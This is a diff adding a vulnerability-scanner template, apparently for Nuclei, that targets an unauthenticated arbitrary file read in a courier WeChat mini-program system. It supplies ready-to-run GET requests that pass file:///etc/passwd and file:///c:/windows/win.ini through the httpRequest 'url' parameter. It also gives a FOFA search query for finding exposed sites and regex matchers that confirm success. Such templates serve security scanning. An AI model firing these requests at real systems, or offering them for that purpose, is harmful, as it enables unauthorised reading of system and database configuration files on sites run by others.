@@ -1,0 +1,34 @@
+id: kuaidi-wechat-httpRequest-fileread
+info:
+  name: 快递微信小程序系统 httpRequest - fileread
+  author: leadlife
+  severity: high
+  description: 快递 微信小程序只系统是基于微信平台开发的轻量级应用，用户无需下载额外的APP，即可在微信内直接使用小程序进行快递操作。该系统集成了多项功能，实现了从寄件下单、物流跟踪到支付结算等全链条的快递服务，极大地提高了用户的便捷性和使用体验。、快递微信小程序系统 htpRequest 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件件、系统配置文件))、数据库配置文件等等，导致网站处于极度不安全状态。
+  reference: 
+    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E5%BF%AB%E9%80%92%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%B3%BB%E7%BB%9F/%E5%BF%AB%E9%80%92%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="static/default/newwap/lang/js/jquery.localize.min.js"
+  tags: kuaidi,wechat,fileread,
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/weixin/index/httpRequest?url=file:///etc/passwd"
+      - "{{BaseURL}}/weixin/index/httpRequest?url=file:///c:/windows/win.ini"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
